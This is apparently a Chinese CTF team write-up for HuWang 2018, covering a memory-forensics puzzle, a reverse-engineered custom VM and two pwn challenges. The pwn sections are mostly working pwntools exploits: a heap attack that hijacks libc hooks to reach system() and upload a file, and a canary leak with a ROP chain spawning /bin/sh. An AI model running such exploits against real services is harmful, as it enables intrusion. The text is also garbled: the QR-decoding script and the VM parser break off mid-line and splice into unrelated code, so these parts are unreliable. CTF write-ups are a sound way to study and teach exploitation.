# HuWang2018 Whitzard
## MISC
### 签到题
脑洞题，不想去猜key，就暴力了一下：
    import base64
    res = ''
    a = "AAoHAR1TIiIkUFUjUFQgVyInVSVQJVFRUSNRX1YgXiJSVyJQVRs="
    a = base64.b64decode(a)
    for i in range(128):
        for j in a:
            res+=chr(i^ord(j))
    print res
### Easy dump
题目给了一个600M的镜像，是取证题  
直接用volatility的imageinfo查看镜像，发现是windows内存镜像，并且可以看到版本信息
    >>>python vol.py -f ./easy_dump.img imageinfo 
    Volatility Foundation Volatility Framework 2.6
    INFO    : volatility.debug    : Determining profile based on KDBG search...
              Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                         AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                         AS Layer2 : FileAddressSpace (/home/blackmax/download/volatility/easy_dump.img)
                          PAE type : No PAE
                               DTB : 0x187000L
                              KDBG : 0xf80004006070L
              Number of Processors : 1
         Image Type (Service Pack) : 0
                    KPCR for CPU 0 : 0xfffff80004007d00L
                 KUSER_SHARED_DATA : 0xfffff78000000000L
               Image date and time : 2018-09-30 05:30:17 UTC+0000
         Image local date and time : 2018-09-30 13:30:17 +0800
volatility提供很多查看当时系统状态信息的指令，我们先用pslist查看当时的进程，发现有个explorer，notepad等常被用来出题的进程，这里只列出这些，实际还有其他一些程序
    0xfffffa80083f4060 notepad.exe            2952   1260      1       57      1      0 2018-09-30 05:18:25 UTC+0000 
    0xfffffa80083ea9f0 dllhost.exe            2740    612     10      197      1      0 2018-09-30 05:30:14 UTC+0000                                 
    0xfffffa800a1a2b30 DumpIt.exe             2256   1260      2       43      1      1 2018-09-30 05:30:16 UTC+0000                                 
    0xfffffa8009b1fb30 conhost.exe            2964    396      2       57      1      0 2018-09-30 05:30:16 UTC+0000
    0xfffffa8009e03630 explorer.exe           1260   1172     34      953      1      0 2018-09-30 05:17:34 UTC
常见的情况会在notepad里开着一个文档藏一些和flag相关的信息，但是这题尝试查看notepad并没有发现一些有用的信息。再尝试从其他程序入手。volatility中对于windows下的程序有很多插件，比如iehistoty插件，可以很方便的查看ie浏览器的浏览记录。
    >>>python vol.py -f ./easy_dump.img --profile=Win7SP1x64 iehistory
    Volatility Foundation Volatility Framework 2.6
    **************************************************
    Process: 1260 explorer.exe
    Cache type "URL " at 0x4235000
    Record length: 0x100
    Location: :2018093020181001: n3k0@file:///C:/phos.jpg
    Last modified: 2018-09-30 13:19:21 UTC+0000
    Last accessed: 2018-09-30 05:19:21 UTC+0000
    File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
    **************************************************
    Process: 1260 explorer.exe
    Cache type "URL " at 0x4235100
    Record length: 0x100
    Location: :2018093020181001: n3k0@:Host: ?????????
    Last modified: 2018-09-30 12:43:38 UTC+0000
    Last accessed: 2018-09-30 04:43:38 UTC+0000
    File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
    **************************************************
    Process: 1260 explorer.exe
    Cache type "URL " at 0x4235200
    Record length: 0x100
    Location: :2018093020181001: n3k0@file:///C:/phos.jpg
    Last modified: 2018-09-30 13:30:14 UTC+0000
    Last accessed: 2018-09-30 05:30:14 UTC+0000
    File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
    **************************************************
这里多条浏览记录都指向本地的一张叫phos.jpg的图片。说明这张图片应该有重要信息。我们接下来要想办法dump这张图片。  
volatility同样有提供dump文件的插件，用filescan扫描一下文件列表，找到了这张jpg
    0x00000000235bec20     12      0 R--r-- \Device\HarddiskVolume1\Windows\SysWOW64\kernel32.dll
    0x00000000235c8770     32      0 RW---- \Device\HarddiskVolume1\phos.jpg
    0x00000000235c91c0     15      1 R--r-d \Device\HarddiskVolume1\Windows\System32\en-US\KernelBase.dll.mui
    0x00000000235c95b0      2      0 RW-rwd \Device\HarddiskVolume1\$Directory
记下偏移0x00000000235c8770，使用dumpfiles把这张图片dump出来
    python vol.py -f ./easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x00000000235c8770 --name -D ~/CTF/HWB
图片打开并没有直接显示flag相关的信息，猜测是jpg隐写，先用010editor打开发现藏了一个zip压缩包，可以手动提取也可以直接用binwalk提取这个zip。  
解压之后里面有个message.img镜像，先strings一下，得到一堆数据和一个奇怪的字符串yispn!buwh_qcfd_ebo_mglzs。看起来是个加密后的flag  
file message.img可以看到是linux下的filesystem
data。使用mount指令挂载之后查看里面的hint.txt文件。文件中有很多数据，第二个数几乎都是从10-269递增，然后第一位数增1，同样第一位也是从10一直增到269.但仔细查看就会发现，中间有不连续的数据存在
    29 190
    29 191
    29 192
    29 193
    29 194
    29 195
    29 196
    29 197
    29 208
    29 209
    29 210
    29 211
    29 212
    29 224
根据提示，txt的数据数量大约为两个相同的数相乘，这容易联想到是个二维码，存在和不存在的数据代表二维码上的黑点和白点  
脚本如下:
    #include 
    #include 
    using namespace std;
    bool mp[275][275];
    int main()
    {
        freopen("./hint.txt","r",stdin);
        freopen("./out2.txt","w",stdout);
        memset(mp,0,sizeof(mp));
        int x, y;
        while (scanf("%d%d",&x,&y)!= EOF){
            mp[x][y]=true;
        }
        for (int i = 0; i  0:
            r.sendafter('?\n', flat(name))
    def fre(idx):
        r.sendlineafter('buy!\n', '2')
        r.sendlineafter('?\n', str(idx))
    def edit(idx, payload):
        r.sendlineafter('buy!\n', '3')
        r.sendlineafter('?\n', str(idx))
        r.sendafter('?\n', flat(payload))
    def make_money():
        r.sendlineafter('!\n', '1')
        r.sendlineafter('?\n', 'AAAAAAA')
    def login():
        for i in range(20):
            make_money()
        r.sendlineafter('man!\n', '3')
    def exploit(r):
        login()
        add(1000, 'qwe')
        add(1000, 'sh\x00')
        fre(0)
        add(0, '')
        r.sendlineafter('buy!\n', '3')
        r.sendlineafter('?\n', str(2))
        r.recvuntil('OK, what would you like to modify ')
        tmp = r.recvline()[:6]
        assert tmp[-1] == '\x7f'
        libc.address = u64(tmp + '\0\0') - libc.sym['__malloc_hook'] - 0x448
        info('%016x libc.address', libc.address)
        r.sendline('qwe')
        edit(-1, libc.address+0x3c3ef8)
        edit(-21, libc.sym['system'])
        fre(1)
        r.sendlineafter('$ ', 'cd /tmp')
        r.sendlineafter('$ ', 'cat  x.b64')
        r.sendline(read('./x').encode('base64'))
        r.sendline('EOF')
        r.interactive()
### huwang （赛后）
先设置round=-1进行交互，程序会循环MD5，此时文件内容为空；另开一个再交互，MD5即为16个NULL的MD5。
name填0x19个字符即可泄漏canary，occupation也塞满，然后栈溢出。
    from pwn import *
    code = ELF('./huwang', checksec=False)
    context.arch = code.arch
    context.log_level = 'debug'
    def exploit(r):
        name = 'A'*0x19
        r.sendlineafter('>> \n', '666')
        r.sendafter('\n', name)
        r.sendlineafter('\n', 'y')
        r.sendlineafter('\n', '1')
        r.sendafter('\n', 'J\xe7\x136\xe4K\xf9\xbfy\xd2u.#H\x18\xa5')
        r.sendafter('?', 'a'*0xff)
        r.recvuntil('AAAAAAAAAAAAAAAAAAAAAAAAA')
        canary = u64('\0' + r.recv(7))
        info('%016x canary', canary)
        r.sendlineafter('[Y/N]\n', 'Y')
        pop_rdi_ret = gadget('pop rdi; ret')
        leave_ret = gadget('leave; ret')
        buf = 0x603800
        r.send(flat(
            'A'*0x108,
            canary,
            buf, 
            pop_rdi_ret, code.got['read'],
            code.plt['puts'],
            make_rop([0x401550, 0x40156A], code.got['read'], [0, buf, 0x100], rbp=buf),
            leave_ret,
        ))
        r.recvline()
        tmp = r.recvline().strip() + '\0\0'
        libc.address = u64(tmp) - libc.sym['read']
        r.send(flat(
            0, 
            pop_rdi_ret, libc.search('/bin/sh').next(),
            libc.sym['system'],
        ))
        r.interactive()
###
## RE
### RERERE
搜索字符串找到main函数，发现很多函数都是用通过一个函数表调用的。  
依次查看调用的几个函数，从sub_401530函数中可以看出明显的VM特征，而之前读取的unk_404018即为VM代码。  
因为VM代码较长，将每个指令的作用还原后，我们用python写了个parser来翻译：
    import struct
    p=0
    def out(x):
        print str(p)+ ' '+x
    s=open('vm','rb').read()
    f = struct.Struct('>I')
    ss=''
    hashp=0
    while p > 4) + '++')
            p += 2
        elif s[p] == 'N':
            out('reg' + str(ord(s[p+1]) >> 4) + '--')
            p += 2
        elif s[p] == 'G':
            out('reg' + str(ord(s[p+1]) >> 4) + ' ^= reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'Y':
            out('reg' + str(ord(s[p+1]) >> 4) + ' -= reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'J':
            out('reg' + str(ord(s[p+1]) >> 4) + ' &= reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'S':
            out('reg' + str(ord(s[p+1]) >> 4) + ' += reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'X':
            out('reg' + str(ord(s[p+1]) >> 4) + ' *= reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'O':
            out('mem = ' + (s[p+1:p+5]).encode('hex') )
            if((f.unpack(s[p+1:p+5])[0]) > 1000):
                ss+=(s[p+1:p+5]).encode('hex')
            p += 5
        elif s[p] == 'T':
            out('reg' + str(ord(s[p+1]) >> 4) + ' = mem')
            p += 2
        elif s[p] == 'Q':
            out('reg' + str(ord(s[p+1]) >> 4) + ' = reg'+ str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'F':
            out('reg' + str(ord(s[p+1]) >> 4) + ' = hash[hashp]')
            p += 2
        elif s[p] == 'U':
            out('rep reg3 ' + str(p-ord(s[p+1])) )
            p += 2
        elif s[p] == 'H':
            out('cmp reg' + str(ord(s[p+1]) >> 4) + ' reg'+str(ord(s[p+1])&0xF) )
            p += 2
        elif s[p] == 'D':
            out('jl ' + str(p+2+ord(s[p+1])) )
            p += 2
        elif s[p] == 'M':
            out('jg ' + str(p+2+ord(s[p+1])) )
            p += 2
        elif s[p] == 'K':
            out('jz ' + str(p+2+ord(s[p+1])) )
            p += 2
        elif s[p] == 'I':
            hashp+=1
            out('hashp++')
            p += 1
        elif s[p] == 'V':
            hashp-=1
            out('hashp--')
            p += 1
        elif s[p] == 'C':
            out('exit' )
            p += 1
        else:
            out(s[p])
            p += 1
    print ss[::-1].upper()
翻译后的结果：
    0 mem = 47
    5 rep reg3 0
    7 reg3 = mem
    9 reg0 = hash[hashp]
    11 reg2 ^= reg2
    13 cmp reg0 reg2
    15 jz 68
    17 hashp++